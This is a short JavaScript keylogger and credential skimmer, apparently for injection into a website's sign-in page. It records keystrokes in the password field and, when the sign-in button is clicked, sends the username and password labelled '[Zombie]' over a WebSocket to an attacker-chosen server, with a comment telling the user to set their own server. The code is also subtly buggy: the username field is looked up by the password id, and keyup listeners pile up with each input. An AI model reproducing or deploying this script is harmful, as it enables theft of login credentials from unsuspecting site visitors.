let passwordInputField = document.getElementById("password");
let usernameInputField = document.getElementById("password");
let submitButton = document.getElementsByClassName("js-sign-in-button")[0];
let cachedUsername = (cachedPassword = "");

let brainSocket = new WebSocket(
    // Change this to your own Server!
    "ws://localhost:666/ws"
);

brainSocket.onopen = function () {
    usernameInputField.addEventListener("input", function (event) {
        cachedUsername = event.target.value;
    });

    passwordInputField.addEventListener("input", function (event) {
        document.addEventListener("keyup", function (event) {
            if (event.key != "Backspace" && event.key != "Enter" && event.key != "Control") {
                cachedPassword += event.key;
            } else if (event.key == "Backspace") {
                cachedPassword = cachedPassword.substring(0, cachedPassword.length - 1);
            }
        });
    });

    submitButton.addEventListener("click", function (event) {
        brainSocket.send(
            `[Zombie][${window.location.host.toUpperCase()}] Username: ${cachedUsername.toString()} Password: ${cachedPassword.toString()}`
        );
    });
};
